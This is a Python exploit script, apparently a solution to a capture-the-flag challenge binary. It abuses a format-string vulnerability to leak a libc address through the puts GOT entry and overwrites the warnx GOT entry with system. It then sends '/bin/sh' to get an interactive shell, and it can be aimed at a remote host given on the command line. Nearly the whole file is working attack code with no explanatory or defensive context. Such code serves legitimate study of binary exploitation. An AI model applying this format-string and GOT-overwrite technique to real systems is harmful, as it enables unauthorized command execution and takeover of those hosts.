#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
import re

context.log_level = 'debug'
exe = context.binary = ELF('./string_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *print+6
# b *0x804875D

c
c
'''.format(**locals())

p = start()

# ==================== EXPLOIT ====================

def choice(option: int):
    sla(b'> ', f'{option}'.encode())

def exploit():

    choice(1)
    payload = p32(exe.got.puts) + b'.%p.%p.%p.%p.%s.%p'

    sla(b': ', payload)

    choice(2)

    ru(b':  ')
    data = (rl()[:-1].split(b'.'))
    print(data)
    puts = u32(data[5][:4].ljust(0x4, b'\00'))
    libc.address = puts - libc.sym.puts
    slog('puts', puts)
    slog('libc base', libc.address)

    offset = 6
    write = {

        exe.got.warnx: libc.sym.system

    }

    choice(1)
    payload = b'.' * 4 + fmtstr_payload(offset, write, write_size='byte', numbwritten=4)
    sla(b': ', payload)
    choice(2)    

    choice(1)
    sla(b': ', b'/bin/sh')
    choice(2)

    interactive(flag=True)

if __name__ == '__main__':
    exploit()
